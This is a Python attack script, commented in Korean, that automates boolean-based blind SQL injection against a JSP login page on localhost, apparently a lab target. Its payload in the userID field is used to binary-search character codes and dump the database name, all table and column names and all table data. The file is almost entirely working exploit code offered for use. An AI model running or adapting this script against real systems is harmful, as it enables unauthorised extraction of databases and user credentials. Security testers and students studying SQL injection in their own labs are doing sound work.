import requests
import time

url = "http://localhost:9999/TestJSP/loginAction.jsp"  # 타겟 url

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Cookie": "JSESSIONID=416CBD48EB8A066D479A37C5091EE9D4"
}

def database_name(blind_query):
    query = "SELECT database()"  # 현재 데이터베이스의 이름을 찾는 쿼리
    index_value = "실패"  # 참 거짓 식별용
    value = binarySearch(query, index_value)
    print("데이터베이스 이름:", value)
   
extracted_table_names = []  # 테이블 이름 리스트 

def extract_table_names(blind_query):
    index = 0
    global extracted_table_names  # 전역 변수 사용 선언
    while True:
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit {index},1"
        index_value = "실패"  # 참 거짓 식별용
        value = binarySearch(query, index_value)
        if value == "":
            break
        extracted_table_names.append(value)
        #print(f"데이터베이스 테이블 이름 [{index}]:", value)
        index += 1
    return extracted_table_names

extracted_column_names = []  # 컬럼 이름 리스트

def extract_column_names(table, blind_query):
    index = 0
    global extracted_column_names  # 전역 변수 사용 선언
    while True:
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database() limit {index},1"
        index_value = "실패"  # 참 거짓 식별용
        value = binarySearch(query, index_value)
        if value == "":
            break
        extracted_column_names.append(value)
        #print(f"테이블 [{table}]의 컬럼 이름 [{index}]:", value)
        index += 1
    return extracted_column_names

extracted_data = []
# 데이터 추출을 위한 새로운 함수
def extract_data(table, column, blind_query):
    index = 0
    global extracted_data
    while True:
        query = f"SELECT {column} FROM {table} limit {index},1"
        index_value = "실패"  # 참 거짓 식별용
        value = binarySearch(query, index_value)
        if value == "":
            break
        extracted_data.append(value)
        index += 1
    return extracted_data



def binarySearch(query, index_value):
    s = 1
    start = 32
    end = 126
    value = ""
    while True:
        mid = int((start+end)/2)
        data = {
            "userID": "gildong" + blind_query.format(query, s, 0),
            "userPassword": "123"
        }
        
        response = requests.post(url, data=data, headers=headers)
        index_value = "실패"
        if index_value in response.text: 
            break
        else:
            data = {
            "userID": "gildong" + blind_query.format(query, s, mid),
            "userPassword": "123"                
            }
            
            response = requests.post(url, data=data, headers=headers)

            if index_value in response.text:
                end = mid 
            else:
                start = mid

            if start+1 >= end:   
                value += chr(end) 
                s += 1
                start = 32
                end = 126
                

    return value


blind_query = "' AND ascii(substring(({}),{},1))>{} AND '1'='1'-- "

database_name(blind_query)  # 데이터베이스 이름 추출

time.sleep(1)

extract_table_names(blind_query)  # 테이블 이름 추출

for table_name in extracted_table_names:
    time.sleep(1) # 1초 대기
    extract_column_names(table_name, blind_query)  # 컬럼 이름 추출

    # 해당 테이블의 모든 컬럼 이름 출력
    print(f"테이블 [{table_name}]의 모든 컬럼 이름:", extracted_column_names)

    for column_name in extracted_column_names:
        extracted_data = []  # 컬럼 데이터를 추출하기 전에 리스트 초기화
        extract_data(table_name, column_name, blind_query)
        print(f"테이블 [{table_name}], 컬럼 [{column_name}]의 모든 데이터:", extracted_data)

        print('*'*50)


# for column_name in extracted_column_names:
#     data_list = extract_data(table_name, column_name, blind_query)
#     print(f"테이블 [{table_name}], 컬럼 [{column_name}]의 모든 데이터:", data_list)